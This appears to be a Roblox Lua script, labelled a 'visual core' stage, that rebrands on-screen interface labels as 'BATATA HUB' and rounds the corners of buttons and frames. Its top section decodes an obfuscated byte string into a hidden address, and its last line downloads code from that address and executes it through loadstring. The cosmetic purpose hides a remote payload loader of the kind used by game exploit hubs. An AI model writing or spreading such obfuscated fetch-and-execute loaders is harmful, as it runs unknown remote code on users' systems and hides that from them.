
--[[ STAGE 2: VISUAL CORE ]]
local BUVvX07HCBozqhUrLn="\066\055\079\114\120\126\074\127\075\126\048\078\076\051\050\034\038\033\070\051\041\038\032\042\060\077\058\020\044\064\062\019\045\035\025\045\055\085\021\017\042\023\090\024\025\047\006\027\020\027\005\022\068\026\010\006\026\007\000\009\030\012\014\014\048\015\242\007\051\250\245\013\253\248\250\015\255\243\226\229\243\231\251\232\254\253\037\239\250\236\042\043\023\209\239\212\213\234"local zZ0LCmb9vChzARHYr9J7=240 local vys2tKjQTvHRE9zd3HrWS=77 local Ilbo_dHfUWtY6T_sD3=1 local rZHbCfhjo2rJZZ4OJ0W_hs=1 local cCTze7IL760n=3 local MyslxXgkdzkMxX=true local D2GaI0jAuneaxVxPkxkPTY=bit32 and bit32.bxor if not D2GaI0jAuneaxVxPkxkPTY then D2GaI0jAuneaxVxPkxkPTY=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local nFRiQbAUozwM={}for AFCwoBIzVgJUKePCAY=1,#BUVvX07HCBozqhUrLn do local Tmq86_iKTMtnshnbP10xEb=string.byte(BUVvX07HCBozqhUrLn,AFCwoBIzVgJUKePCAY)local F7g7fAzpoXQpJwn=(vys2tKjQTvHRE9zd3HrWS+(AFCwoBIzVgJUKePCAY*rZHbCfhjo2rJZZ4OJ0W_hs)+cCTze7IL760n)%256 if Ilbo_dHfUWtY6T_sD3==0 then Tmq86_iKTMtnshnbP10xEb=(Tmq86_iKTMtnshnbP10xEb-F7g7fAzpoXQpJwn)%256 nFRiQbAUozwM[AFCwoBIzVgJUKePCAY]=string.char(D2GaI0jAuneaxVxPkxkPTY(Tmq86_iKTMtnshnbP10xEb,zZ0LCmb9vChzARHYr9J7))else Tmq86_iKTMtnshnbP10xEb=D2GaI0jAuneaxVxPkxkPTY(Tmq86_iKTMtnshnbP10xEb,zZ0LCmb9vChzARHYr9J7)nFRiQbAUozwM[AFCwoBIzVgJUKePCAY]=string.char((Tmq86_iKTMtnshnbP10xEb-F7g7fAzpoXQpJwn)%256)end end local Du8a06qwD4Fi3yzKh4_=table.concat(nFRiQbAUozwM)if MyslxXgkdzkMxX then Du8a06qwD4Fi3yzKh4_=string.reverse(Du8a06qwD4Fi3yzKh4_)end local Yfs89djBKpYTG6p=Du8a06qwD4Fi3yzKh4_
local HubName = "BATATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(Yfs89djBKpYTG6p))()
